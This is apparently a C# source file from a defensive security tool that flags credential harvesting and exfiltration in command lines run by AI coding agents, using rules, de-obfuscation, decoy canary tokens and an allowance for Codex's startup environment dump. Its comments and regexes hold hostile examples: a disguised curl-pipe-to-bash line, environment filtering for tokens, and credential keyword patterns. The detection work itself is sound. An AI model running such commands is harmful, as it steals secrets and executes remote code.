using Foreman.Core.Models;
using Foreman.Core.Profiles;
using System.Text.RegularExpressions;

namespace Foreman.Core.Heuristics;

public sealed class CommandAnalyzer
{
    public static CommandAnalyzer Instance { get; } = new();

    /// <summary>
    /// The per-install decoy sentinel (B9 polish), set by the App from settings when decoys are planted. When this
    /// random token (unknown to the shipped binary) appears in a command line, a harvester read a decoy and is
    /// staging/exfiltrating it — synthesizes a Critical cred-040. Null/empty ⇒ only the static cred-040 rule applies.
    /// </summary>
    public static string? DecoySentinelToken { get; set; }

    private static readonly Regex _harnessEnvironmentSnapshot = new(
        @"(?is)\bGet-ChildItem\s+Env:(?!\w).*_SHELL_ENV_DELIMITER_",
        RegexOptions.Compiled | RegexOptions.IgnoreCase,
        TimeSpan.FromMilliseconds(50));

    // A genuine Codex startup snapshot enumerates ALL env vars; a harvester FILTERS the env output for secrets
    // (`Get-ChildItem Env: | findstr TOKEN`). The cred-013 downgrade is forgeable by appending the delimiter
    // marker to ANY command, so refuse the downgrade when the line also credential-filters the enumeration.
    private static readonly Regex _envCredentialFilter = new(
        @"(?is)(?:findstr|Select-String|\bsls\b|grep|Where-Object|\?)\b.{0,40}?\b(?:token|key|secret|passw|cred|api[-_]?key|aws|ssh|gpg)\b",
        RegexOptions.Compiled | RegexOptions.IgnoreCase,
        TimeSpan.FromMilliseconds(50));

    private CommandAnalyzer() { }

    /// <summary>
    /// Evaluates a command line against all loaded rules.
    /// Returns null if no rule matches or the match is suppressed.
    /// Call from any thread — thread-safe after PatternLibrary.Initialize().
    /// </summary>
    public RuleMatch? Analyze(string commandLine, string? processName = null, HarnessProfile? profile = null)
    {
        if (string.IsNullOrWhiteSpace(commandLine)) return null;

        var match = MatchRules(commandLine, processName, profile);

        // Obfuscation pass: also evaluate a de-obfuscated view (caret/backtick escapes stripped,
        // whitespace collapsed, -EncodedCommand decoded) so e.g. `c^u^r^l http://x ^| bash` or an
        // encoded IEX-download is caught. Matching BOTH forms means normalization can only ADD a
        // detection (or surface a higher-severity one), never drop the raw match.
        var normalized = CommandNormalizer.Normalize(commandLine);
        if (!string.Equals(normalized, commandLine, StringComparison.Ordinal))
        {
            var normMatch = MatchRules(normalized, processName, profile);
            if (normMatch is not null && (match is null || normMatch.Severity > match.Severity))
                match = normMatch;
        }

        // B9 polish: the per-install decoy sentinel (a random token the shipped binary never reveals) appearing in
        // a command line means a harvester read one of our decoys and is staging its value — Critical, dominating
        // any lesser match. Plain ordinal Contains (the token is hex, no regex needed).
        var decoy = DecoySentinelToken;
        if (!string.IsNullOrEmpty(decoy) && decoy.Length >= 8
            && (commandLine.Contains(decoy, StringComparison.Ordinal) || normalized.Contains(decoy, StringComparison.Ordinal))
            && (match is null || match.Severity < ForemanSeverity.Critical))
        {
            return DecoySentinelMatch();
        }

        // Codex's shell bridge runs `Get-ChildItem Env: … _SHELL_ENV_DELIMITER_` at startup, which trips
        // the env-var credential-search rule (cred-013) as a false positive. Downgrade to a Low notice —
        // but ONLY when cred-013 is the most-severe match (the rule loop already ran, so a command that
        // also trips a higher rule like curl|bash or iex-from-web reports THAT instead) AND the process
        // is the Codex harness. This is a scoped reclassification, never a pre-loop bypass.
        if (match is { RuleId: "cred-013" }
            && IsCodexHarness(profile)
            && IsHarnessEnvironmentSnapshot(commandLine))
        {
            return HarnessEnvironmentSnapshotNotice();
        }

        return match;
    }

    // Runs the rule set (sorted severity-descending) against one text, returning the most-severe
    // non-suppressed match, or null. Used for both the raw and the normalized command line.
    private static RuleMatch? MatchRules(string text, string? processName, HarnessProfile? profile)
    {
        foreach (var (rule, regex) in PatternLibrary.Instance.Rules)
        {
            try
            {
                var m = regex.Match(text);
                if (!m.Success) continue;
                if (FalsePositiveFilter.IsSuppressed(rule, text, processName, profile)) continue;

                return new RuleMatch(
                    rule.Id,
                    rule.Name,
                    rule.Description,
                    rule.Guidance,
                    rule.ParsedSeverity,
                    rule.Id.Split('-')[0],
                    m.Value);
            }
            catch (RegexMatchTimeoutException)
            {
                // regex timed out — move on, don't hang
            }
        }
        return null;
    }

    private static bool IsCodexHarness(HarnessProfile? profile) =>
        profile?.Name is { Length: > 0 } name &&
        name.Contains("codex", StringComparison.OrdinalIgnoreCase);

    private static bool IsHarnessEnvironmentSnapshot(string commandLine)
    {
        try
        {
            // Must look like the bare startup enumeration AND must NOT be filtering the env output for secrets —
            // the latter is a harvest dressed up with the (forgeable) delimiter marker, never the benign form.
            return _harnessEnvironmentSnapshot.IsMatch(commandLine)
                && !_envCredentialFilter.IsMatch(commandLine);
        }
        catch (RegexMatchTimeoutException) { return false; }
    }

    private static RuleMatch DecoySentinelMatch() => new(
        "cred-040",
        "decoy credential sentinel observed",
        "A TraceBrake decoy (canary) credential's PER-INSTALL sentinel appeared in a command line. Nothing legitimate ever handles a decoy you planted as bait, so a process read one of the fake credential files and is now staging or exfiltrating its value — the highest-confidence sign of an active credential harvester (and the random token means it couldn't have been pre-scrubbed from knowledge of TraceBrake's binary).",
        "Treat this as an active credential-theft incident. Identify the process handling the decoy and what it did with it. Real credentials adjacent to the decoy paths should be considered targeted: rotate them. Preserve the event for investigation.",
        ForemanSeverity.Critical,
        "cred",
        "decoy sentinel");

    private static RuleMatch HarnessEnvironmentSnapshotNotice() => new(
        "cred-013-harness",
        "Harness environment snapshot",
        "A known AI harness shell setup command enumerated environment variables. This can be expected client plumbing, but it is still worth noticing because environment variables often contain tokens and API keys.",
        "1. If this was spawned by the harness shell bridge during startup or command setup, no action is usually required.\n2. Avoid storing long-lived secrets in process environment variables when running AI coding agents.\n3. If an ordinary task deliberately requested environment variables, review the output and rotate any exposed secrets.",
        ForemanSeverity.Low,
        "cred",
        "Get-ChildItem Env:");
}
